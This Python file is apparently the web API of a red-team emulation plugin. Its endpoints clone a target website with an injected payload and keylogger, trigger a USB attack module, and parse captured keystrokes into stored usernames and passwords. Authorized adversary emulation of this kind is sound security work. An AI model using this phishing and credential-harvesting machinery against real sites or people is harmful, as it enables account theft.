from aiohttp import web
from aiohttp_jinja2 import template

from app.objects.secondclass.c_fact import Fact
from plugins.access.app.red.red_clone import RedClone
from plugins.access.app.red.red_usb import RedUsb


class AccessApi:

    def __init__(self, services, props):
        self.app_svc = services.get('app_svc')
        self.data_svc = services.get('data_svc')
        self.props = props

    @template('access.html')
    async def landing(self, request):
        full_cloned_url = '%s%s' % (request.host, self.props.get('clone_url'))
        sources = [s.display for s in await self.data_svc.locate('sources')]
        return dict(sources=sources,
                    clone_url=full_cloned_url,
                    clone_site=self.props.get('clone_site'),
                    clone_payload=self.props.get('clone_payload'))

    @staticmethod
    async def malicious(request):
        return web.HTTPFound('/access/malicious/index.html')

    async def clone(self, request):
        body = await request.json()
        self.props['clone_site'] = body['clone_site']
        self.props['inject_payload'] = body['inject_payload']
        self.props['inject_keylogger'] = body['inject_keylogger']
        self.props['assigned_source'] = body['source']
        await RedClone().action(body['clone_site'], self.props)
        return web.json_response(dict(clone_site=self.props['clone_site']))

    async def usb(self, request):
        body = await request.json()
        usb_logs = await RedUsb().action(body['server'], body['drive'], body['platform'])
        return web.json_response(dict(usb_logs=usb_logs))

    async def key_log(self, request):
        body = await request.json()
        await self._parse_key_logger(blob=body['log'])
        return web.HTTPOk()

    """ PRIVATE """

    async def _parse_key_logger(self, blob):
        creds = blob.split('Tab')
        source = await self.data_svc.locate('sources', match=dict(name=self.props['assigned_source']))
        source[0].facts.append(Fact(trait='host.user.name', value=creds[0]))
        source[0].facts.append(Fact(trait='host.user.password', value=creds[1]))
